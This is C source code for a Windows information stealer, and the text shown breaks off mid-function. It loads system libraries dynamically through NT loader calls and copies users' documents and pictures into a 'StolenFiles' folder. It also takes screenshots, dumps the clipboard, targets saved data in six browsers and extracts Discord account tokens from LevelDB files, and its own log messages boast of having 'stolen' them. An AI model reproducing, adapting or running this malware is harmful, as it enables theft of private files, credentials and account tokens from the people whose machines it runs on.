#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <dirent.h>
#include <fcntl.h>
#include <time.h>
#include "./../../include/global.h"
#include "./../../include/crypto.h"
#include "./../../include/browsers.h"
#include "./../../include/extra.h"
#include "./../../include/network.h"

// Function pointers for dynamically loading and managing DLLs and procedures
NtLdrLoadDll LoadLib = NULL;
NtLdrGetProcedureAddress GetProcAdd = NULL;
NtLdrUnloadDll UnloadLib = NULL;
PFNCreateCompatibleDC pfnCreateCompatibleDC = NULL;
PFNCreateCompatibleBitmap pfnCreateCompatibleBitmap = NULL;
PFNGetDeviceCaps pfnGetDeviceCaps = NULL;
PFNBitBlt pfnBitBlt = NULL;
PFNSelectObject pfnSelectObject = NULL;
PFNDeleteDC pfnDeleteDC = NULL;
PFNDeleteObject pfnDeleteObject = NULL;
PFNGetObjectA pfnGetObjectA = NULL;
PFNGetDIBits pfnGetDIBits = NULL;
BCryptOpenAlgorithmProvider_t pBCryptOpenAlgorithmProvider = NULL;
BCryptSetProperty_t pBCryptSetProperty = NULL;
BCryptGenerateSymmetricKey_t pBCryptGenerateSymmetricKey = NULL;
BCryptDecrypt_t pBCryptDecrypt = NULL;
BCryptDestroyKey_t pBCryptDestroyKey = NULL;
BCryptCloseAlgorithmProvider_t pBCryptCloseAlgorithmProvider = NULL;

// Function to retrieve function pointers for NT API functions from ntdll.dll
int GetHandleNTAPI(NtLdrLoadDll *LoadLib, NtLdrGetProcedureAddress *GetProcAdd, NtLdrUnloadDll *UnloadLib) {
    // I used this website so much for the NtAPI stuff here and in the past: https://ntdoc.m417z.com/ ;)

    // Load the ntdll.dll module
    HMODULE hModule = GetModuleHandleW(L"ntdll.dll");
    
    // Check if the module was successfully loaded
    if (NULL == hModule)
    {
        // Return error code if the module could not be loaded
        return 1;
    }
    
    // Retrieve the address of the LdrLoadDll function and store it in LoadLib
    *LoadLib = (NtLdrLoadDll)GetProcAddress(hModule, "LdrLoadDll");
    // Check if the function pointer was successfully retrieved
    if (*LoadLib == NULL)
    {
        // Return error code if the function could not be found
        return 1;
    }
    
    // Retrieve the address of the LdrUnloadDll function and store it in UnloadLib
    *UnloadLib = (NtLdrUnloadDll)GetProcAddress(hModule, "LdrUnloadDll");
    // Check if the function pointer was successfully retrieved
    if (*UnloadLib == NULL)
    {
        // Return error code if the function could not be found
        return 1;
    }
    
    // Retrieve the address of the LdrGetProcedureAddress function and store it in GetProcAdd
    *GetProcAdd = (NtLdrGetProcedureAddress)GetProcAddress(hModule, "LdrGetProcedureAddress");
    // Check if the function pointer was successfully retrieved
    if (*GetProcAdd == NULL)
    {
        // Return error code if the function could not be found
        return 1;
    }
    
    // Return success code if all function pointers were successfully retrieved
    return 0;
}
int FindImportantFiles(char *basePath, const char *tempPath) {
    char path[1000];
    struct dirent *dp;
    DIR *dir = opendir(basePath);

    // Check if the directory could be opened
    if (!dir) {
        printf("ERROR: Could not open directory: %s\n", basePath);
        return 1;
    }
    printf("DEBUG: Opened directory: %s\n", basePath);

    // Read each entry in the directory
    while ((dp = readdir(dir)) != NULL) {
        // Skip the special entries "." and ".."
        if (strcmp(dp->d_name, ".") != 0 && strcmp(dp->d_name, "..") != 0) {
            // Construct the full path for the current directory entry
            strcpy(path, basePath);
            strcat(path, "\\");
            strcat(path, dp->d_name);
            printf("DEBUG: Found entry: %s\n", path);

            // Check if the current path is a directory or a file
            DWORD dwAttributes = GetFileAttributes(path);
            if (dwAttributes == INVALID_FILE_ATTRIBUTES) {
                printf("ERROR: Could not get file attributes for: %s\n", path);
                continue;
            }

            if (dwAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                // It's a directory, so recurse into it
                printf("DEBUG: Recursing into subdirectory (if applicable): %s\n", path);
                FindImportantFiles(path, tempPath);
            } else {
                // It's a file, check if it has an important extension
                if (strstr(path, ".jpg") != NULL || strstr(path, ".txtfc") != NULL || strstr(path, ".docx") != NULL ||
                    strstr(path, ".pdf") != NULL || strstr(path, ".xsls") != NULL || strstr(path, ".csv") != NULL ||
                    strstr(path, ".sql") != NULL) {
                    // Construct the path where the file will be saved
                    char outputdir[MAX_PATH];
                    sprintf(outputdir, "%s\\StolenFiles\\%s", tempPath, dp->d_name);
                    printf("DEBUG: Identified important file: %s\n", path);
                    printf("DEBUG: Output directory for the file: %s\n", outputdir);

                    unsigned char buffer[8192];
                    int err, n;

                    // Open the source file for reading
                    int src_fd = open(path, O_RDONLY);
                    if (src_fd == -1) {
                        printf("ERROR: Could not open source file: %s\n", path);
                        continue;
                    }

                    // Open the destination file for writing (create if not exists)
                    int dst_fd = open(outputdir, O_CREAT | O_WRONLY);
                    if (dst_fd == -1) {
                        printf("ERROR: Could not create/open destination file: %s\n", outputdir);
                        close(src_fd);
                        continue;
                    }

                    // Copy data from the source file to the destination file
                    while (1) {
                        err = read(src_fd, buffer, 8192);
                        if (err == -1) {
                            printf("ERROR: Failed to read from file: %s\n", path);
                            break; // Stop reading on error
                        }
                        n = err;
                        if (n == 0)
                            break; // End of file
                        err = write(dst_fd, buffer, n);
                        if (err == -1) {
                            printf("ERROR: Failed to write to file: %s\n", outputdir);
                            break; // Stop writing on error
                        }
                    }

                    // Close the file descriptors
                    close(src_fd);
                    close(dst_fd);
                    printf("DEBUG: Completed copying file: %s to %s\n", path, outputdir);
                }
            }
        }
    }

    // Close the directory
    closedir(dir);
    printf("DEBUG: Closed directory: %s\n", basePath);

    return 0; // Return success
}
int StealDocuments(const char *folder) {
    // Log message indicating the start of the file search process
    printf("DEBUG: Starting to look for important files in folder: %s\n", folder);
    
    // Create a directory to store the stolen files
    char StolenDirectory[MAX_PATH];
    sprintf(StolenDirectory, "%s\\StolenFiles", folder);
    printf("DEBUG: Creating directory for stolen files: %s\n", StolenDirectory);
    mkdir(StolenDirectory);
    
    char *arr[4096] = {0}; // Array to store paths to be searched
    int pathCount = 0; // Counter for the number of paths
    printf("DEBUG: Initialized array for storing paths with pathCount: %d\n", pathCount);
    
    WIN32_FIND_DATA fdFile;
    HANDLE hFind = NULL;
    char sPath[MAX_PATH] = "C:\\Users\\*";
    
    // Find all directories under C:\\Users\\
    printf("DEBUG: Searching directories in path: %s\n", sPath);
    hFind = FindFirstFile(sPath, &fdFile);
    if (hFind == INVALID_HANDLE_VALUE)
    {
        printf("ERROR: Failed to find first file in path: %s\n", sPath);
        // Return error if FindFirstFile fails
        return -1;
    }
    
    // Loop through all the found entries
    do
    {
        // Skip the special entries "." and ".."
        if (strcmp(fdFile.cFileName, ".") != 0 && strcmp(fdFile.cFileName, "..") != 0)
        {
            // Construct the full path to the user directory
            char fullPath[MAX_PATH];
            snprintf(fullPath, sizeof(fullPath), "C:\\Users\\%s", fdFile.cFileName);
            printf("DEBUG: Found directory: %s\n", fullPath);
            
            // Check if the path is a directory
            DWORD dwRes = GetFileAttributes(fullPath);
            if (dwRes != INVALID_FILE_ATTRIBUTES && (dwRes & FILE_ATTRIBUTE_DIRECTORY))
            {
                printf("DEBUG: Directory exists: %s\n", fullPath);
                
                // Open the directory to access its contents
                HANDLE hDir = CreateFile(fullPath, FILE_LIST_DIRECTORY, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
                if (hDir != INVALID_HANDLE_VALUE)
                {
                    char *DocumentsPath = (char *)malloc(260);
                    char *PicturesPath = (char *)malloc(260);
                    
                    // Check for memory allocation failure
                    if (!DocumentsPath || !PicturesPath)
                    {
                        printf("ERROR: Failed to allocate memory for Documents or Pictures path\n");
                        
                        // Free previously allocated paths and return error
                        for (int i = 0; i < pathCount; ++i) { free(arr[i]); }
                        return -1;
                    }
                    
                    // Construct paths for Documents and Pictures directories
                    snprintf(DocumentsPath, 260, "%s\\Documents", fullPath);
                    snprintf(PicturesPath, 260, "%s\\Pictures", fullPath);
                    printf("DEBUG: Constructed paths: Documents=%s, Pictures=%s\n", DocumentsPath, PicturesPath);
                    
                    // Store the paths in the array
                    if (pathCount < 4096)
                    {
                        arr[pathCount++] = DocumentsPath;
                        arr[pathCount++] = PicturesPath;
                        printf("DEBUG: Paths added to array. Total paths: %d\n", pathCount);
                    }
                    else
                    {
                        // Log message if path list is full and free allocated memory
                        printf("ERROR: Path list is full, freeing memory and returning error\n");
                        free(DocumentsPath);
                        free(PicturesPath);
                        for (int i = 0; i < pathCount; ++i)
                        {
                            free(arr[i]);
                        }
                        return -1;
                    }

                    // Close the directory handle
                    CloseHandle(hDir);
                    printf("DEBUG: Closed directory handle for: %s\n", fullPath);
                }
                else
                {
                    printf("ERROR: Failed to open directory: %s\n", fullPath);
                }
            }
            else
            {
                printf("DEBUG: Skipped, not a directory: %s\n", fullPath);
            }
        }
    } while (FindNextFile(hFind, &fdFile) != 0); // Continue to the next file or directory
    
    // Close the find handle
    FindClose(hFind);
    printf("DEBUG: Completed searching user directories\n");
    
    // Process each path collected
    for (int i = 0; i < pathCount; ++i)
    {
        printf("DEBUG: Processing path: %s\n", arr[i]);
        // Search for important files in each Documents and Pictures directory
        FindImportantFiles(arr[i], folder);
        free(arr[i]); // Free the allocated path memory
        printf("DEBUG: Freed memory for path: %s\n", arr[i]);
    }
    
    printf("DEBUG: Finished processing all paths\n");
    return 0; // Return success
}

int Screenshot(const char *folder) {
    INFO("Trying to get screenshot...");

    // Declare a UNICODE_STRING to store the DLL name for dynamic loading of gdi32.dll
    UNICODE_STRING dllName;
    WCHAR dllNameBuffer[] = L"gdi32.dll";
    dllName.Length = (USHORT)(wcslen(dllNameBuffer) * sizeof(WCHAR));
    dllName.MaximumLength = dllName.Length + sizeof(WCHAR);
    dllName.Buffer = dllNameBuffer;
    ULONG dllCharacteristics = 0;
    PVOID hGdi32 = NULL;
    
    // Dynamically load the GDI32.dll library using LoadLib
    NTSTATUS status = LoadLib(NULL, &dllCharacteristics, &dllName, &hGdi32);
    if (!NT_SUCCESS(status)) { WARN("Error loading gdi32.dll..."); return 1; }
    INFO("Loaded gdi32.dll");

    // Get function pointers for the required GDI32 functions
    ANSI_STRING procName1;
    CHAR procNameBuffer1[] = "CreateCompatibleDC";
    procName1.Length = (USHORT)strlen(procNameBuffer1);
    procName1.MaximumLength = procName1.Length + 1;
    procName1.Buffer = procNameBuffer1;
    PVOID CreateCompatibleDCProcAddress = NULL;
    NTSTATUS STATUS1 = GetProcAdd(hGdi32, &procName1, 0, &CreateCompatibleDCProcAddress);
    if (!NT_SUCCESS(STATUS1) || CreateCompatibleDCProcAddress == NULL) { WARN("Error getting pointer to address of CreateCompatibleDC()"); UnloadLib(hGdi32); return -3; }
    PFNCreateCompatibleDC pfnCreateCompatibleDC = (PFNCreateCompatibleDC)CreateCompatibleDCProcAddress;

    ANSI_STRING procName2;
    CHAR procNameBuffer2[] = "CreateCompatibleBitmap";
    procName2.Length = (USHORT)strlen(procNameBuffer2);
    procName2.MaximumLength = procName2.Length + 1;
    procName2.Buffer = procNameBuffer2;
    PVOID CreateCompatibleBitmapProcAddress = NULL;
    NTSTATUS STATUS2 = GetProcAdd(hGdi32, &procName2, 0, &CreateCompatibleBitmapProcAddress);
    if (!NT_SUCCESS(STATUS2) || CreateCompatibleBitmapProcAddress == NULL) { WARN("Error getting pointer to address of CreateCompatibleBitmap()"); UnloadLib(hGdi32); return -3; }
    PFNCreateCompatibleBitmap pfnCreateCompatibleBitmap = (PFNCreateCompatibleBitmap)CreateCompatibleBitmapProcAddress;

    ANSI_STRING procName3;
    CHAR procNameBuffer3[] = "GetDeviceCaps";
    procName3.Length = (USHORT)strlen(procNameBuffer3);
    procName3.MaximumLength = procName3.Length + 1;
    procName3.Buffer = procNameBuffer3;
    PVOID GetDeviceCapsProcAddress = NULL;
    NTSTATUS STATUS3 = GetProcAdd(hGdi32, &procName3, 0, &GetDeviceCapsProcAddress);
    if (!NT_SUCCESS(STATUS3) || GetDeviceCapsProcAddress == NULL) { WARN("Error getting pointer to address of GetDeviceCaps()"); UnloadLib(hGdi32); return -3; }
    PFNGetDeviceCaps pfnGetDeviceCaps = (PFNGetDeviceCaps)GetDeviceCapsProcAddress;

    ANSI_STRING procName4;
    CHAR procNameBuffer4[] = "BitBlt";
    procName4.Length = (USHORT)strlen(procNameBuffer4);
    procName4.MaximumLength = procName4.Length + 1;
    procName4.Buffer = procNameBuffer4;
    PVOID BitBltProcAddress = NULL;
    NTSTATUS STATUS4 = GetProcAdd(hGdi32, &procName4, 0, &BitBltProcAddress);
    if (!NT_SUCCESS(STATUS4) || BitBltProcAddress == NULL) { WARN("Error getting pointer to address of BitBlt()"); UnloadLib(hGdi32); return -3; }
    PFNBitBlt pfnBitBlt = (PFNBitBlt)BitBltProcAddress;

    ANSI_STRING procName5;
    CHAR procNameBuffer5[] = "SelectObject";
    procName5.Length = (USHORT)strlen(procNameBuffer5);
    procName5.MaximumLength = procName5.Length + 1;
    procName5.Buffer = procNameBuffer5;
    PVOID SelectObjectProcAddress = NULL;
    NTSTATUS STATUS5 = GetProcAdd(hGdi32, &procName5, 0, &SelectObjectProcAddress);
    if (!NT_SUCCESS(STATUS5) || SelectObjectProcAddress == NULL) { WARN("Error getting pointer to address of SelectObject()"); UnloadLib(hGdi32); return -3; }
    PFNSelectObject pfnSelectObject = (PFNSelectObject)SelectObjectProcAddress;

    ANSI_STRING procName6;
    CHAR procNameBuffer6[] = "DeleteDC";
    procName6.Length = (USHORT)strlen(procNameBuffer6);
    procName6.MaximumLength = procName6.Length + 1;
    procName6.Buffer = procNameBuffer6;
    PVOID DeleteDCProcAddress = NULL;
    NTSTATUS STATUS6 = GetProcAdd(hGdi32, &procName6, 0, &DeleteDCProcAddress);
    if (!NT_SUCCESS(STATUS6) || DeleteDCProcAddress == NULL) { WARN("Error getting pointer to address of DeleteDC()"); UnloadLib(hGdi32); return -3; }
    PFNDeleteDC pfnDeleteDC = (PFNDeleteDC)DeleteDCProcAddress;

    ANSI_STRING procName7;
    CHAR procNameBuffer7[] = "DeleteObject";
    procName7.Length = (USHORT)strlen(procNameBuffer7);
    procName7.MaximumLength = procName7.Length + 1;
    procName7.Buffer = procNameBuffer7;
    PVOID DeleteObjectProcAddress = NULL;
    NTSTATUS STATUS7 = GetProcAdd(hGdi32, &procName7, 0, &DeleteObjectProcAddress);
    if (!NT_SUCCESS(STATUS7) || DeleteObjectProcAddress == NULL) { WARN("Error getting pointer to address of DeleteObject()"); UnloadLib(hGdi32); return -3; }
    PFNDeleteObject pfnDeleteObject = (PFNDeleteObject)DeleteObjectProcAddress;

    ANSI_STRING procName8;
    CHAR procNameBuffer8[] = "GetObjectA";
    procName8.Length = (USHORT)strlen(procNameBuffer8);
    procName8.MaximumLength = procName8.Length + 1;
    procName8.Buffer = procNameBuffer8;
    PVOID PFNGetObjectAProcAddress = NULL;
    NTSTATUS STATUS8 = GetProcAdd(hGdi32, &procName8, 0, &PFNGetObjectAProcAddress);
    if (!NT_SUCCESS(STATUS8) || PFNGetObjectAProcAddress == NULL) { WARN("Error getting pointer to address of PFNGetObjectA()"); UnloadLib(hGdi32); return -3; }
    PFNGetObjectA pfnGetObjectA = (PFNGetObjectA)PFNGetObjectAProcAddress;

    ANSI_STRING procName9;
    CHAR procNameBuffer9[] = "GetDIBits";
    procName9.Length = (USHORT)strlen(procNameBuffer9);
    procName9.MaximumLength = procName9.Length + 1;
    procName9.Buffer = procNameBuffer9;
    PVOID GetDIBitsProcAddress = NULL;
    NTSTATUS STATUS9 = GetProcAdd(hGdi32, &procName1, 0, &GetDIBitsProcAddress);
    if (!NT_SUCCESS(STATUS9) || GetDIBitsProcAddress == NULL) { WARN("Error getting pointer to address of GetDIBits()"); UnloadLib(hGdi32); return -3; }
    PFNGetDIBits pfnGetDIBits = (PFNGetDIBits)GetDIBitsProcAddress;
    
    // If any of the function pointers could not be obtained, return an error
    if (!pfnCreateCompatibleDC || !pfnCreateCompatibleBitmap || !pfnGetDeviceCaps || !pfnBitBlt     ||
        !pfnSelectObject       || !pfnDeleteDC               || !pfnDeleteObject  || !pfnGetObjectA ||
        !pfnGetDIBits) { WARN("Error getting function addresses from gdi.dll"); return 1; }



    // Prepare to save the screenshot file with a timestamped filename
    char filename[MAX_PATH];
    SYSTEMTIME st;
    GetLocalTime(&st); // Get the current local time
    
    // Create a unique file name for the screenshot using the folder path and timestamp
    snprintf(filename, sizeof(filename), "%s\\screenshot_%04d%02d%02d_%02d%02d%02d.bmp", 
             folder, st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    
    // Get a handle to the screen device context (DC)
    HDC hScreenDC = GetDC(NULL);
    
    // Create a memory device context (DC) compatible with the screen DC
    HDC hMemoryDC = pfnCreateCompatibleDC(hScreenDC);
    
    // Get the screen's width and height using GetDeviceCaps
    int screenWidth = pfnGetDeviceCaps(hScreenDC, HORZRES);
    int screenHeight = pfnGetDeviceCaps(hScreenDC, VERTRES);
    
    // Create a bitmap compatible with the screen DC
    HBITMAP hBitmap = pfnCreateCompatibleBitmap(hScreenDC, screenWidth, screenHeight);
    if (!hBitmap)
    {
        // If the bitmap creation fails, clean up and return an error
        WARN("Failed to create bitmap");
        pfnDeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        return 1;
    }
    
    // Select the newly created bitmap into the memory DC
    pfnSelectObject(hMemoryDC, hBitmap);
    
    // Perform a bit-block transfer (BitBlt) to copy the screen content into the memory DC
    if (!pfnBitBlt(hMemoryDC, 0, 0, screenWidth, screenHeight, hScreenDC, 0, 0, SRCCOPY))
    {
        // If BitBlt fails, clean up and return an error
        pfnDeleteObject(hBitmap);
        pfnDeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        return 1;
    }
    
    // Structures to hold bitmap and image info
    BITMAP bmp;
    BITMAPINFOHEADER bi;
    BITMAPINFO biInfo;
    DWORD dwSizeofDIB;
    BYTE *pPixels = NULL;
    HANDLE hFile;
    DWORD dwWritten;
    BITMAPFILEHEADER bfh;
    
    // Get the bitmap object information into the BITMAP structure
    if (!pfnGetObjectA(hBitmap, sizeof(BITMAP), &bmp))
    {
        // If GetObjectA fails, clean up and return an error
        pfnDeleteObject(hBitmap);
        pfnDeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        return 1;
    }
    
    // Prepare the BITMAPINFOHEADER structure for the screenshot
    biInfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    biInfo.bmiHeader.biWidth = bmp.bmWidth;
    biInfo.bmiHeader.biHeight = -bmp.bmHeight; // Negative height to flip image vertically
    biInfo.bmiHeader.biPlanes = 1;
    biInfo.bmiHeader.biBitCount = bmp.bmBitsPixel;
    biInfo.bmiHeader.biCompression = BI_RGB; // No compression
    biInfo.bmiHeader.biSizeImage = ((bmp.bmWidth * bmp.bmBitsPixel + 31) / 32) * 4 * bmp.bmHeight;
    biInfo.bmiHeader.biClrUsed = 0;
    biInfo.bmiHeader.biClrImportant = 0;
    
    // Calculate the size of the device-independent bitmap (DIB) data
    dwSizeofDIB = biInfo.bmiHeader.biSize + biInfo.bmiHeader.biSizeImage;
    
    // Allocate memory for the pixel data of the DIB
    pPixels = (BYTE *)malloc(dwSizeofDIB);
    if (!pPixels)
    {
        // If memory allocation fails, clean up and return an error
        pfnDeleteObject(hBitmap);
        pfnDeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        return 1;
    }
    
    // Retrieve the bits from the bitmap into the allocated pixel buffer
    if (!pfnGetDIBits(hScreenDC, hBitmap, 0, bmp.bmHeight, pPixels, &biInfo, DIB_RGB_COLORS))
    {
        // If GetDIBits fails, clean up and return an error
        free(pPixels);
        pfnDeleteObject(hBitmap);
        pfnDeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        return 1;
    }
    
    // Release the screen device context
    ReleaseDC(NULL, hScreenDC);
    
    // Create a new file to save the screenshot
    hFile = CreateFile(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        // If file creation fails, log the error and clean up
        WARN("Could not create file %s. Google the mf code: %lu", filename, GetLastError());
        free(pPixels);
        pfnDeleteObject(hBitmap);
        pfnDeleteDC(hMemoryDC);
        return 1;
    }
    
    // Prepare and write the BITMAPFILEHEADER to the file
    bfh.bfType = 0x4D42; // 'BM' identifier for bitmap files
    bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bfh.bfSize = bfh.bfOffBits + dwSizeofDIB;
    bfh.bfReserved1 = 0;
    bfh.bfReserved2 = 0;
    
    // Write the bitmap headers and pixel data to the file
    if (!WriteFile(hFile, &bfh, sizeof(BITMAPFILEHEADER), &dwWritten, NULL) ||
        !WriteFile(hFile, &biInfo.bmiHeader, sizeof(BITMAPINFOHEADER), &dwWritten, NULL) ||
        !WriteFile(hFile, pPixels, dwSizeofDIB, &dwWritten, NULL))
    {
        // If writing the file fails, return an error
        WARN("Could not write to file %s. Google the mf code: %lu", filename, GetLastError());
        CloseHandle(hFile);
        free(pPixels);
        pfnDeleteObject(hBitmap);
        pfnDeleteDC(hMemoryDC);
        return 1;
    }
    else
    {
        // Log success message
        OKAY("Bitmap file (aka screenshot) file, has been created successfully!\n\n\n\n\n");
    }
    
    // Close the file handle and free allocated resources
    CloseHandle(hFile);
    free(pPixels);
    pfnDeleteObject(hBitmap);
    pfnDeleteDC(hMemoryDC);
    
    return 0; // Return success
}
int Clipboard(const char *folder) {
    // Try to open the clipboard. If it fails, return 1
    if (!OpenClipboard(NULL))
    {
        return 1;
    }

    // Create the file path where clipboard data will be saved.
    // The file will be named "clipboard-data.txt" in the given temporary directory.
    char output[MAX_PATH];
    sprintf(output, "%s\\clipboard-data.txt", folder);

    // Open the file in write mode. This file will store the clipboard data.
    FILE *file = fopen(output, "w");

    // Get the clipboard data in text format
    HANDLE hData = GetClipboardData(CF_TEXT);
    
    // If clipboard data is not available, close the file and clipboard, and return 1 (indicating an error).
    if (hData == NULL)
    {
        fclose(file);
        CloseClipboard();
        return 1;
    }

    // Lock the clipboard data to get a pointer to the data.
    char *pContent = (char *)GlobalLock(hData);

    // If the clipboard data is successfully locked, write the data to the file.
    if (pContent != NULL)
    {
        // Write the clipboard content to the file.
        fprintf(file, "%s\n", pContent);
        
        // Log a success message (this seems like a custom function).
        OKAY("Clipboard data has been stolen successfully! Saved to %s.\n\n\n\n\n", output);
        
        // Unlock the global memory object (release the clipboard data).
        GlobalUnlock(hData);
    }
    else
    {
        // If locking the clipboard data failed, return 1.
        return 1;
    }

    // Close the file after writing the clipboard content.
    fclose(file);
    
    // Close the clipboard to release its lock.
    CloseClipboard();

    // Return 0 to indicate success.
    return 0;
}
int Browsers(const char *folder_where_to_save_data, char *current_username) {
    // Fill in the paths with the current username / path.
    char browser_paths[6][MAX_PATH] = {
        {0},
        {0},
        {0},
        {0},
        {0},
        {0}
    };

    sprintf(browser_paths[0], "%s\\AppData\\Local\\Google\\Chrome\\User Data", current_username);               // Chrome
    sprintf(browser_paths[1], "%s\\AppData\\Local\\Microsoft\\Edge\\User Data", current_username);              // Edge
    sprintf(browser_paths[2], "%s\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles", current_username);            // Firefox
    sprintf(browser_paths[3], "%s\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data", current_username); // Brave
    sprintf(browser_paths[4], "%s\\AppData\\Local\\Yandex\\YandexBrowser\\User Data", current_username);        // Yandex
    sprintf(browser_paths[5], "%s\\AppData\\Roaming\\Opera Software\\Opera Stable", current_username);          // Opera
    int num_browsers = sizeof(browser_paths) / sizeof(browser_paths[0]); // Number of browsers to iterate through.

    // Make dir to store browser passwords.
    char BrowsersStorePath[MAX_PATH]; snprintf(BrowsersStorePath, sizeof(BrowsersStorePath), "%s\\AppData\\Local\\Temp\\bizfum\\Browsers", current_username); mkdir(BrowsersStorePath);

    // Iterate over the list of browsers to check for their installed paths.
    for (int i = 0; i < num_browsers; i++)
    {
        // Check if the path exists and is a directory.
        DWORD attributes = GetFileAttributes(browser_paths[i]);
        if (attributes != INVALID_FILE_ATTRIBUTES && (attributes & FILE_ATTRIBUTE_DIRECTORY))
        {

            // Call the appropriate function for each browser based on the index.
            if (i == 0)
            {
                // Since sqlite reader is needed for reading the database of Chrome. Skip to the next browser if DLL is not found.
                if (access("C:\\Windows\\System32\\winsqlite3.dll", F_OK) != 0) {
                    printf("Didn't find winsqlite3.dll.\n");
                    continue;
                }

                // Make dir to store Chrome data.
                char ChromeStorage[MAX_PATH]; snprintf(ChromeStorage, sizeof(ChromeStorage), "%s\\AppData\\Local\\Temp\\bizfum\\Browsers\\Chrome", current_username); mkdir(ChromeStorage);
                Chrome(ChromeStorage, current_username); // Process Chrome.
            }

            else if (i == 1)
            {
                Edge(folder_where_to_save_data, current_username); // Process Edge.
            }
            else if (i == 2)
            {
                char FirefoxStorage[MAX_PATH];
                snprintf(FirefoxStorage, sizeof(FirefoxStorage), "%s\\AppData\\Local\\Temp\\bizfum\\Browsers\\Firefox", current_username);
                mkdir(FirefoxStorage);
                Firefox(FirefoxStorage, current_username); // Process Firefox.
            }
            else if (i == 3)
            {
                Brave(folder_where_to_save_data, current_username); // Process Brave.
            }
            else if (i == 4)
            {
                Yandex(folder_where_to_save_data, current_username); // Process Yandex.
            }
            else if (i == 5)
            {
                // Since sqlite reader is needed for reading the database of Opera. skip to the next browser.
                if (access("C:\\Windows\\System32\\winsqlite3.dll", F_OK) != 0) {
                    printf("Didn't find the sqlite dll.\n");
                    continue;
                }
                Opera(folder_where_to_save_data, current_username); // Process Opera.
            }
        }
    }
    return 0;
}
int AccountTokens(char *temp, char *userf) {
    // The file will be named "Account-Tokens.txt" in the given temporary directory.
    char output[MAX_PATH];
    sprintf(output, "%s\\Account-Tokens.txt", temp);

    // Array to store up to 10 Discord tokens, each with a maximum length of 100 characters.
    char DiscordTokens[10][100] = {0};
    int DiscordTokensLength = 0;
    
    char path[MAX_PATH]; // Buffer to hold the path to the Discord folder.
    char *user = getenv("username"); // Get the current user's username from the environment variables.

    // Build the path to Discord's LevelDB storage in the AppData folder.
    // The '*' at the end is used for file pattern matching (to find all files in the directory).
    sprintf(path, "C:\\Users\\%s\\AppData\\Roaming\\discord\\Local Storage\\leveldb\\*", user);
    
    char PreviousFilename[MAX_PATH - 5]; // Store the previous file name to avoid processing the same file.
    char FileFullPath[MAX_PATH]; // Buffer to hold the full path of each file.
    // Variables for file searching.
    HANDLE hFileFind;
    WIN32_FIND_DATAA FirstFile, NextFile;

    // Start finding files in the LevelDB directory.
    hFileFind = FindFirstFileA(path, &FirstFile);
    if (hFileFind == INVALID_HANDLE_VALUE)
    {
        return 1; // If no files are found or the directory doesn't exist, return an error.
    }

    // Process the first file found.
    sprintf(FileFullPath, "%.*s%s", (int)(strlen(path) - 1), path, FirstFile.cFileName); // Build the full path for the first file.
    Discord(FileFullPath, DiscordTokens, &DiscordTokensLength); // Call the Discord function to extract tokens from the file.
    // Continue searching for the next files in the directory.
    while (TRUE)
    {
        // Find the next file in the directory.
        FindNextFileA(hFileFind, &NextFile);
        // Check if the current file matches the previous file to avoid processing it again.
        if (!strcmp(PreviousFilename, NextFile.cFileName))
        {
            break; // If it's the same file, stop the loop.
        }

        // Store the current file name for the next iteration.
        sprintf(PreviousFilename, NextFile.cFileName);

        // Build the full path for the current file and call the Discord function.
        sprintf(FileFullPath, "%.*s%s", (int)(strlen(path) - 1), path, NextFile.cFileName);
        Discord(FileFullPath, DiscordTokens, &DiscordTokensLength); // Extract tokens from the file.
    }

    // Success message.
    printf("\n\n");
    OKAY("Successfully stole saved Discord tokens! Saved to %s\n\n\n\n\n", output);

    // Print out each of the found Discord tokens.
    for (int i = 0; i < 10; i++) {
        if (DiscordTokens[i][0] != '\0')
        {
            // Write to file tokens.
            FILE *file = fopen(output, "w");
            fprintf(file, "Discord Token: %s\n", DiscordTokens[i]);
            fclose(file);
        }
    }

    return 0; // Return success.
}
int Discord(const char *FilePath, char StoreTokens[10][100], int *StoreTokensLength) {
    // Check if the file extension is either .ldb or .log, if not, return immediately.
    char *extension = FilePath + (strlen(FilePath) - 4);
    if (strcmp(extension, ".ldb") && strcmp(extension, ".log"))
    {
        return 0; // Invalid file extension, not a Discord database or log file.
    }

    // Open the file in binary mode and read its contents into memory.
    FILE *fp = fopen(FilePath, "rb");
    fseek(fp, 0, SEEK_END); // Move the file pointer to the end to get the file size.
    long file_size = ftell(fp); // Get the total size of the file.
    fseek(fp, 0, SEEK_SET); // Reset the file pointer to the beginning.
    char *data = (char *)malloc(file_size * sizeof(char)); // Allocate memory to hold the file content.
    fread(data, sizeof(char), file_size, fp); // Read the file content into the data buffer.
    fclose(fp); // Close the file.

    // Variables for handling the encrypted token.
    char *encrypted_token = NULL;
    size_t encrypted_tokenSize = 0;
    DWORD dword_encrypted_tokenSize = 0;

    // Loop through the file to locate the base64-encoded encrypted token, identified by "dQw4w9WgXcQ:" prefix.
    for (size_t i = 0; i <= file_size - strlen("dQw4w9WgXcQ:"); ++i)
    {
        // Compare the current part of the file data with the token identifier.
        if (memcmp(data + i, "dQw4w9WgXcQ:", strlen("dQw4w9WgXcQ:")) == 0)
        {
            char *base64 = data + i + strlen("dQw4w9WgXcQ:"); // Pointer to the start of the base64-encoded token.
            char *end_of_token = strchr(base64, '"'); // Locate the end of the token by finding the next double-quote.
            if (end_of_token != NULL)
            {
                *end_of_token = '\0'; // Null-terminate the token string.
                Base64DecodingFunc(base64, &encrypted_token, &dword_encrypted_tokenSize); // Decode the base64 token.
                encrypted_tokenSize = (size_t)dword_encrypted_tokenSize; // Store the size of the decoded token.
                break; // Exit the loop after finding and decoding the token.
